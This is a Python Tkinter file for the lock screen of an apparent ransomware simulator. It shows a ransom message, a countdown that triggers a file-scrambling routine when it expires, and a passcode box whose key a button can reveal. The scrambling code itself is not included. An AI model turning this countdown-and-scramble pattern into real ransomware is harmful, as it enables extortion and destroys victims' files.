import os
from tkinter import Tk, Label, Entry, Button, messagebox, PhotoImage
from PIL import ImageTk, Image


from core.logger import logger
from core.config import Config
from core.scrambler import Scrambler
from core.state_manager import StateManager
from core.util import get_remaining_seconds


class UI:
    def __init__(self, config: Config, state: StateManager, scrambler: Scrambler):
        self.config = config
        self.state = state
        self.cleaner = scrambler
        self.showing_passcode = False
        self.timer_label: Label | None = None
        self.image_label: Label | None = None
        self.passcode_entry = None
        self.running = True
        self.root = Tk()
        icon_path = os.path.join("assets", "face.png")
        if os.path.exists(icon_path):
            icon = PhotoImage(file=icon_path)
            self.root.iconphoto(True, icon)
        else:
            print("Icon file not found:", icon_path)

    def _update_timer(self):
        if self.state.is_passcode_entered():
            return  # Hide timer when unlocked
        if not self.timer_label:
            return

        secs = get_remaining_seconds(
            self.state.get("start_time"), self.config.time_limit
        )

        if secs <= 0:
            if not self.state.is_scrambled():
                self.cleaner.scramble_all()
                self.state.set("scrambled", True)
            self.timer_label.config(text="💥 Time's up!")
            if not self.image_label:
                self.image_label = Label(self.root)
            img_path = os.path.join("assets", "angry-face.png")
            if os.path.exists(img_path):
                image = Image.open(img_path).resize((250, 250))  # Resize
                self.photo = ImageTk.PhotoImage(image)  # Must keep ref to self!
                self.image_label.configure(image=self.photo)
                self.image_label.place(relx=0.5, rely=0.4, anchor="s")
                # image_label = Label(self.root, image=self.photo)
                # image_label.pack(pady=10)

        else:
            mins, secs = divmod(secs, 60)
            self.timer_label.config(text=f"⏳ Time remaining: {mins:02}:{secs:02}")
            self.root.after(1000, self._update_timer)

    def _toggle_passcode(self):
        if self.showing_passcode:
            self.passcode_label.config(text="********")
            self.toggle_btn.config(text="Show Passcode")
            self.showing_passcode = False
        else:
            self.passcode_label.config(text=self.state.get_passcode())
            self.toggle_btn.config(text="Hide Passcode")
            self.showing_passcode = True

    def _render_unlocked_ui(self):
        self.root.geometry("550x645")
        img_path = os.path.join("assets", "happy-face.png")
        if os.path.exists:
            image = Image.open(img_path).resize((250, 250))  # Resize
            self.photo = ImageTk.PhotoImage(image)  # Must keep ref to self!
            image_label = Label(self.root, image=self.photo)
            image_label.pack(pady=10)
        Label(self.root, text="🎉 You're unlocked!", font=("Helvetica", 20)).pack(
            pady=30
        )
        Button(self.root, text="Reset App", command=self.reset_app).pack(pady=20)

    def reset_app(self):
        self.state.reset()
        messagebox.showinfo("Reset", "🔁 App reset. Restart to begin.")
        self.root.destroy()
        # self._setup_ui()

    def __checkinput(
        self,
        e1,
    ):
        userinputkey = e1.get()
        if userinputkey == self.state.get_passcode():
            self.state.set("passcode_entered", True)
            messagebox.showinfo("Unlocked", "Passcode correct! You're safe.")
            self._setup_ui()
        else:
            messagebox.showerror("Incorrect", "Wrong passcode.")

    def _render_locked_ui(self):
        img_path = os.path.join("assets", "face.png")
        if os.path.exists(img_path):
            image = Image.open(img_path).resize((250, 250))  # Resize
            self.photo = ImageTk.PhotoImage(image)  # Must keep ref to self!
            image_label = Label(self.root, image=self.photo)
            image_label.pack(pady=10)

        # img = ImageTk.PhotoImage(Image.open("./assets/face.png").resize((250, 250)))
        # panel = Label(self.root, image=img)
        # panel.place(relx=0.5, rely=0.4, anchor="s")
        self.root.title(self.config.window_title)
        self.root.geometry("550x645")
        # try:

        # except Exception as e:
        #     logger.error(f"Failed to load image: {e}")

        Label(self.root, text=self.config.ransom_message, wraplength=290).place(
            relx=0.5, rely=0.82, anchor="s"
        )

        # Countdown
        self.timer_label = Label(
            self.root, text="", font=("Arial", 16), bg="white", fg="black"
        )
        self.timer_label.place(relx=0.5, rely=0.56, anchor="s")

        # Passcode toggle
        self.passcode_label = Label(
            self.root, text="******", font=("Courier", 14), bg="white"
        )
        self.passcode_label.place(relx=0.40, rely=0.644, anchor="s")

        self.toggle_btn = Button(
            self.root, text="Show Passcode", command=self._toggle_passcode
        )
        self.toggle_btn.place(relx=0.60, rely=0.65, anchor="s")

        Label(self.root, text="Input key:").place(relx=0.40, rely=0.90, anchor="s")
        e1 = Entry(self.root, width=18)
        e1.place(relx=0.62, rely=0.90, anchor="s")
        Button(
            self.root,
            text="Enter",
            width=10,
            font=("Helvetica", 8),
            command=lambda: (self.__checkinput(e1)),
        ).place(relx=0.5, rely=0.956, anchor="s")
        self._update_timer()

    def _setup_ui(self):
        for widget in self.root.winfo_children():
            widget.destroy()
        if self.state.is_passcode_entered():
            self._render_unlocked_ui()
        else:
            self._render_locked_ui()

    def run(self):
        logger.info("GUI started. Waiting for user input...")
        self._setup_ui()
        self.root.mainloop()
